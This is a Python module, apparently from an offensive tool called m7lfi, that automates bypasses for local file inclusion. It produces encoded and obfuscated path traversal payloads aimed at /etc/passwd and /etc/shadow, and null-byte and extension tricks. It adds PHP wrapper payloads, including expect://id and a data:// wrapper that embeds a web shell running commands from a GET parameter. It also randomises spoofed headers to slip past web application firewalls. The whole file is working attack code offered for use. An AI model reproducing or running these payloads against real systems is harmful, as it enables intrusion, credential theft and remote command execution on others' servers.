"""
m7lfi - Bypass Engine
Milkyway Intelligence | Author: Sharlix
Adaptive bypass logic: applies evasion techniques based on what got blocked.
"""

import random
from typing import List


# ─── Random User-Agent pool for WAF evasion ───────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "curl/7.88.1",
    "python-httpx/0.25.0",
    "Go-http-client/2.0",
    "Wget/1.21.3",
]

# ─── Randomized headers for stealth mode ─────────────────────────────────────
STEALTH_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "10.0.0.1"},
    {"X-Remote-IP": "10.0.0.1"},
    {"X-Client-IP": "192.168.1.1"},
    {"Via": "1.1 proxy.example.com"},
    {"Referer": "https://www.google.com/"},
    {"Origin": "https://www.google.com"},
]


class BypassEngine:
    """
    Applies adaptive bypass techniques based on what the response analyzer found.
    Rule-based: each block signal maps to specific bypass strategies.
    """

    def __init__(self):
        self._blocked_encodings = set()  # Track which encodings didn't work

    # ── Main entry point ──────────────────────────────────────────────────────

    def apply_bypass(
        self,
        payload: str,
        waf_detected: bool,
        blocked_patterns: List[str],
        attempt: int = 0,
    ) -> List[str]:
        """
        Returns a prioritized list of bypass payloads to try next.
        `attempt` tracks how many times we've already tried against this param.
        """
        bypass_list = []

        # ── Rule 1: Basic traversal blocked → encoding variants ───────────
        if any("/" in p or ".." in p for p in blocked_patterns) or attempt == 0:
            bypass_list.extend(self._encoding_variants(payload))

        # ── Rule 2: WAF detected → stealth encoding + slow down hint ─────
        if waf_detected:
            bypass_list.extend(self._waf_bypass_variants(payload))

        # ── Rule 3: Keyword "passwd" blocked → split keyword ─────────────
        if "passwd" in payload.lower():
            bypass_list.extend(self._keyword_split_variants(payload))

        # ── Rule 4: PHP wrappers ──────────────────────────────────────────
        bypass_list.extend(self._wrapper_variants(payload))

        # ── Rule 5: Null byte and extension tricks ────────────────────────
        bypass_list.extend(self._extension_bypass(payload))

        # Deduplicate, remove original
        seen = set([payload])
        result = []
        for p in bypass_list:
            if p not in seen:
                seen.add(p)
                result.append(p)

        return result

    # ── Bypass technique implementations ─────────────────────────────────────

    def _encoding_variants(self, payload: str) -> List[str]:
        """URL encoding and double encoding variants."""
        variants = []

        # Single URL encode
        variants.append(payload.replace("../", "..%2f"))
        variants.append(payload.replace("../", "..%2F"))
        variants.append(payload.replace("/", "%2f"))

        # Double encode
        variants.append(payload.replace("../", "..%252f"))
        variants.append(payload.replace("../", "..%252F"))

        # Unicode overlong encoding
        variants.append(payload.replace("../", "..%c0%af"))
        variants.append(payload.replace("../", "..%c1%9c"))
        variants.append(payload.replace("../", "..%ef%bc%8f"))

        # Mix forward and backslash
        variants.append(payload.replace("../", "..\\"))
        variants.append(payload.replace("/", "\\/"))

        return variants

    def _waf_bypass_variants(self, payload: str) -> List[str]:
        """Techniques specifically to evade WAF pattern matching."""
        variants = []

        # Case variation
        variants.append(payload.replace("etc", "ETC").replace("passwd", "PASSWD"))
        variants.append(payload.replace("etc", "Etc"))

        # Dot-dot tricks
        variants.append(payload.replace("../", "....//"))
        variants.append(payload.replace("../", "..././"))
        variants.append(payload.replace("../", ".%00.%00/"))

        # Path normalization tricks
        variants.append(payload.replace("../", ".%2e/"))
        variants.append(payload.replace("../", "%2e%2e/"))
        variants.append(payload.replace("../", "%2e%2e%2f"))

        return variants

    def _keyword_split_variants(self, payload: str) -> List[str]:
        """Split sensitive keywords to bypass keyword filters."""
        variants = []

        # Insert null between chars
        variants.append(payload.replace("passwd", "pa%00sswd"))
        variants.append(payload.replace("passwd", "pa\x00sswd"))

        # Replace with /proc/self/fd/1 alternative reads
        variants.append(payload.replace("/etc/passwd", "/proc/self/fd/2"))
        variants.append(payload.replace("/etc/passwd", "/dev/stdin"))

        # Shadow file
        variants.append(payload.replace("/etc/passwd", "/etc/shadow"))
        variants.append(payload.replace("/etc/passwd", "/etc/hosts"))

        return variants

    def _wrapper_variants(self, payload: str) -> List[str]:
        """PHP wrapper variants for source disclosure."""
        wrappers = []

        # Only add wrappers if not already a wrapper payload
        if not payload.startswith("php://") and not payload.startswith("data://"):
            base_file = "/etc/passwd"
            if "etc" in payload:
                # Extract target file from payload
                parts = payload.split("/")
                if len(parts) >= 2:
                    base_file = "/" + "/".join(parts[-2:])

            wrappers.append(f"php://filter/convert.base64-encode/resource={base_file}")
            wrappers.append(f"php://filter/read=string.rot13/resource={base_file}")
            wrappers.append("expect://id")
            wrappers.append("data://text/plain,<?php system($_GET['cmd']); ?>")

        return wrappers

    def _extension_bypass(self, payload: str) -> List[str]:
        """Null byte and extension bypass tricks."""
        variants = []
        variants.append(payload + "%00")
        variants.append(payload + "%00.jpg")
        variants.append(payload + "/..")
        variants.append(payload + "?")
        return variants

    # ── Header randomizer for stealth mode ───────────────────────────────────

    def random_headers(self) -> dict:
        """Return randomized headers for stealth requests."""
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        # Add 1-2 random stealth headers
        for hdr in random.sample(STEALTH_HEADERS, min(2, len(STEALTH_HEADERS))):
            headers.update(hdr)
        return headers
